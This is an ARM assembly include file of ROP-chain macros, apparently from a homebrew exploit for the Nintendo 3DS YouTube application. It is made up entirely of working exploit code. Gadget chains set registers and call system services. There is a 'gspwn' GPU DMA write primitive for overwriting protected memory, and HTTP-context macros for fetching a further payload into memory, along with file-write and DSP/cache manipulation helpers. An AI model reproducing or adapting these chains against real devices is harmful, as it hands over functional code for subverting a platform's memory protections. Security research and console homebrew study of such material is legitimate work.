PAYLOAD_PRIM_LOC equ 0x1f05DC00
PAYLOAD_SEC_LOC equ 0x15000000
PAYLOAD_THIRD_LOC equ 0x15100000

.include "../build/constants.s"

YTB_HTTPC_HANDLE equ (YTB_HTTPC_STRUCT + 0x2C)

.macro set_lr,_lr
	.word YTB_ROP_POP_R1PC ; pop {r1, pc}
		.word YTB_ROP_NOP ; pop {pc}
	.word YTB_ROP_POP_R4LR_BX_R1 ; pop {r4, lr} ; bx r1
		.word 0xFFFFFFFF ; r4 (garbage)
		.word _lr ; lr
.endmacro

.macro sleep,nanosec_low,nanosec_high
	set_lr YTB_ROP_NOP
	.word YTB_ROP_POP_R0PC ; pop {r0, pc}
		.word nanosec_low ; r0
	.word YTB_ROP_POP_R1PC ; pop {r1, pc}
		.word nanosec_high ; r1
	.word YTB_SVC_SLEEPTHREAD
.endmacro

.macro set_thread_priority,priority
	set_lr YTB_ROP_NOP
	.word YTB_ROP_POP_R0PC ; pop {r0, pc}
		.word 0xFFFF8000 ; r0
	.word YTB_ROP_POP_R1PC ; pop {r1, pc}
		.word priority ; r1
	.word YTB_SVC_SETTHREADPRIORITY
.endmacro

.macro memcpy,dst,src,size
	set_lr YTB_ROP_NOP
	.word YTB_ROP_POP_R0PC ; pop {r0, pc}
		.word dst ; r0
	.word YTB_ROP_POP_R1PC ; pop {r1, pc}
		.word src ; r1
	.word YTB_ROP_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word size ; r2
		.word 0xFFFFFFFF ; r3 (garbage)
		.word 0xFFFFFFFF ; r4 (garbage)
		.word 0xFFFFFFFF ; r5 (garbage)
		.word 0xFFFFFFFF ; r6 (garbage)
	.word YTB_MEMCPY
.endmacro

.macro getServiceHandle,dst,name_0,name_1,name_length
	set_lr YTB_ROP_POP_R4R5PC
	.word YTB_ROP_POP_R0PC ; pop {r0, pc}
		.word dst ; r0
	.word YTB_ROP_POP_R1PC ; pop {r1, pc}
		.word PAYLOAD_LOC + @@service_name ; r1
	.word YTB_ROP_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word name_length ; r2 (addr)
		.word 0xFFFFFFFF ; r3 (garbage)
		.word 0xFFFFFFFF ; r4 (garbage)
		.word 0xFFFFFFFF ; r5 (garbage)
		.word 0xFFFFFFFF ; r6 (garbage)
	.word YTB_SRV_GETSERVICEHANDLEWRAPPER
		@@service_name:
		.word name_0, name_1
.endmacro

.macro httpcCreateContextWrapper, context_struct, url, method, use_proxy
	set_lr YTB_ROP_NOP
	.word YTB_ROP_POP_R0PC ; pop {r0, pc}
		.word context_struct ; r0
	.word YTB_ROP_POP_R1PC ; pop {r1, pc}
		.word url ; r1
	.word YTB_ROP_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word method ; r2 (addr)
		.word use_proxy ; r3
		.word 0xFFFFFFFF ; r4 (garbage)
		.word 0xFFFFFFFF ; r5 (garbage)
		.word 0xFFFFFFFF ; r6 (garbage)
	.word YTB_HTTPC_CREATECONTEXTWRAPPER
.endmacro

.macro httpcInitialize
	set_lr YTB_ROP_NOP
	.word YTB_ROP_POP_R0PC ; pop {r0, pc}
		.word YTB_HTTPC_HANDLE ; r0
	.word YTB_ROP_POP_R1PC ; pop {r1, pc}
		.word 0x00000000 ; r1
	.word YTB_ROP_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word 0x00001000 ; r2
		.word 0x00000000 ; r3
		.word 0xFFFFFFFF ; r4 (garbage)
		.word 0xFFFFFFFF ; r5 (garbage)
		.word 0xFFFFFFFF ; r6 (garbage)
	.word YTB_HTTPC_INITIALIZE
.endmacro

.macro httpcBeginRequest, handle_ptr, context_ptr
	set_lr YTB_ROP_NOP
	.word YTB_ROP_POP_R0PC
		.word handle_ptr ; r0 (handle ptr)
	.word YTB_ROP_LDR_R0R0_POP_R4PC
		.word YTB_APT_HANDLE ; r4 (context handle)
	.word YTB_ROP_STR_R0R4_POP_R4PC
		.word 0xFFFFFFFF ; r4 (garbage)

	.word YTB_ROP_POP_R0PC
		.word context_ptr ; r0 (context handle ptr)
	.word YTB_ROP_LDR_R0R0_POP_R4PC
		.word 0xFFFFFFFF ; r4 (garbage)
	.word YTB_ROP_POP_R1PC
		.word PAYLOAD_LOC - 0x100 ; dummy ptr
	.word YTB_APT_ISREGISTERED ; same cmd header as httpcBeginRequest
.endmacro

.macro httpcReceiveData, handle, context_ptr, buffer_addr, buffer_size
	.word YTB_ROP_POP_R0PC ; pop {r0, pc}
		.word handle ; r0
	.word YTB_ROP_POP_R1PC ; pop {r1, pc}
		.word context_ptr ; r1
	.word YTB_ROP_POP_R3PC
		.word YTB_ROP_NOP
	.word YTB_ROP_LDR_R1R1_BLX_R3
	.word YTB_ROP_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word buffer_addr ; r2 (addr)
		.word buffer_size ; r3
		.word YTB_HTTPC_RECEIVEDATA ; r4 (garbage)
		.word 0xFFFFFFFF ; r5 (garbage)
		.word 0xFFFFFFFF ; r6 (garbage)
	.word YTB_ROP_BLX_R4_ADD_SPx10_POP_R4PC
		.word 0xFFFFFFFF ; garbage
		.word 0xFFFFFFFF ; garbage
		.word 0xFFFFFFFF ; garbage
		.word 0xFFFFFFFF ; garbage
		.word 0xFFFFFFFF ; r4 (garbage)
.endmacro

.macro dsp_unloadcomponent
	set_lr YTB_ROP_NOP
	.word YTB_ROP_POP_R0PC ; pop {r0, pc}
		.word YTB_DSP_HANDLE ; r0 (handle ptr)
	.word YTB_DSP_UNLOADCOMPONENT
.endmacro

.macro dsp_registerinterruptevents
	set_lr YTB_ROP_NOP
	.word YTB_ROP_POP_R0PC ; pop {r0, pc}
		.word YTB_DSP_HANDLE ; r0 (handle ptr)
	.word YTB_ROP_POP_R1PC ; pop {r1, pc}
		.word 0x00000000 ; r1 (handle ptr)
	.word YTB_ROP_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word 0x00000002 ; r2
		.word 0x00000002 ; r3
		.word 0xFFFFFFFF ; r4 (garbage)
		.word 0xFFFFFFFF ; r5 (garbage)
		.word 0xFFFFFFFF ; r6 (garbage)
	.word YTB_DSP_REGISTERINTERRUPTEVENTS
.endmacro

.macro flush_dcache,addr,size
	set_lr YTB_ROP_NOP
	.word YTB_ROP_POP_R0PC ; pop {r0, pc}
		.word YTB_GSPGPU_HANDLE ; r0 (handle ptr)
	.word YTB_ROP_POP_R1PC ; pop {r1, pc}
		.word 0xFFFF8001 ; r1 (process handle)
	.word YTB_ROP_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word addr ; r2 (addr)
		.word size ; r3 (src)
		.word 0xDEADBABE ; r4 (garbage)
		.word 0xDEADBABE ; r5 (garbage)
		.word 0xDEADBABE ; r6 (garbage)
	.word YTB_GSPGPU_FLUSHDATACACHE
.endmacro

.macro gspwn,dst,src,size
	set_lr YTB_ROP_POP_R4R5R6R7R8R9R10R11PC
	.word YTB_ROP_POP_R0PC ; pop {r0, pc}
		.word YTB_GSPGPU_INTERRUPT_RECEIVER_STRUCT + 0x58 ; r0 (nn__gxlow__CTR__detail__GetInterruptReceiver)
	.word YTB_ROP_POP_R1PC ; pop {r1, pc}
		.word PAYLOAD_LOC + @@gxCommandPayload ; r1 (cmd addr)
	.word YTB_GSPGPU_GXTRYENQUEUE
		@@gxCommandPayload:
		.word 0x00000004 ; command header (SetTextureCopy)
		.word src ; source address
		.word dst ; destination address (standin, will be filled in)
		.word size ; size
		.word 0xFFFFFFFF ; dim in
		.word 0xFFFFFFFF ; dim out
		.word 0x00000008 ; flags
		.word 0x00000000 ; unused
.endmacro

.macro gspgpuSetBufferSwap,screen,framebuf_adr,flags
	; get TLS
	set_lr YTB_ROP_ADD_R0R0R4_POP_R4PC
	.word YTB_ROP_POP_R4PC
		.word 0x80 - 0x5C ; r4 (offset)
	.word YTB_ROP_MRC_R0C13C03_ADD_R0R0x5C_BX_LR
		.word 0xFFFFFFFF ; r4 (garbage)

	; memcpy to it
	set_lr YTB_ROP_NOP
	.word YTB_ROP_POP_R1PC ; pop {r1, pc}
		.word PAYLOAD_LOC + @@cmdBuf ; r1 (cmd addr)
	.word YTB_ROP_POP_R2R3R4R5R6PC ; pop {r2, r3, r4, r5, r6, pc}
		.word @@cmdBuf_end - @@cmdBuf ; r2
		.word 0xFFFFFFFF ; r3 (garbage)
		.word 0xFFFFFFFF ; r4 (garbage)
		.word 0xFFFFFFFF ; r5 (garbage)
		.word 0xFFFFFFFF ; r6 (garbage)
	.word YTB_MEMCPY

	; grab handle
	.word YTB_ROP_POP_R0PC ; pop {r0, pc}
		.word YTB_GSPGPU_HANDLE ; r0 (handle ptr)
	.word YTB_ROP_LDR_R0R0_POP_R4PC
		.word 0xFFFFFFFF ; r4 (garbage)

	; do command
	set_lr YTB_ROP_POP_R4R5R6R7R8R9R10R11R12PC
	.word YTB_SVC_SENDSYNCREQUEST
		@@cmdBuf:
		.word 0x00050200 ; command header
		.word screen
		.word 0x00000008
		.word framebuf_adr
		.word framebuf_adr
		.word 240 * 3
		.word flags
		.word 0x00000000
		.word 0x00000000
		@@cmdBuf_end:
.endmacro

.macro fopen,f,name,flags
	set_lr YTB_ROP_NOP
	.word YTB_ROP_POP_R0PC
		.word f
	.word YTB_ROP_POP_R1PC
		.word name
	.word YTB_ROP_POP_R2R3R4R5R6PC
		.word flags ; r2
		.word 0xFFFFFFFF ; r3
		.word 0xFFFFFFFF ; r4
		.word 0xFFFFFFFF ; r5
		.word 0xFFFFFFFF ; r6
	.word YTB_OPENFILE
.endmacro

.macro fwrite,f,bytes_written,data,size,flush
	set_lr YTB_ROP_POP_R1PC
	.word YTB_ROP_POP_R0PC
		.word f
	.word YTB_ROP_POP_R1PC
		.word bytes_written ; bytes written
	.word YTB_ROP_POP_R2R3R4R5R6PC
		.word data ; r2
		.word size ; r3
		.word 0xFFFFFFFF ; r4
		.word 0xFFFFFFFF ; r5
		.word 0xFFFFFFFF ; r6
	.word YTB_WRITEFILE
		.word flush
.endmacro

.macro control_archive,archive
	set_lr YTB_ROP_NOP
	.word YTB_ROP_POP_R0PC
		.word archive
	.word YTB_CONTROLARCHIVE
.endmacro
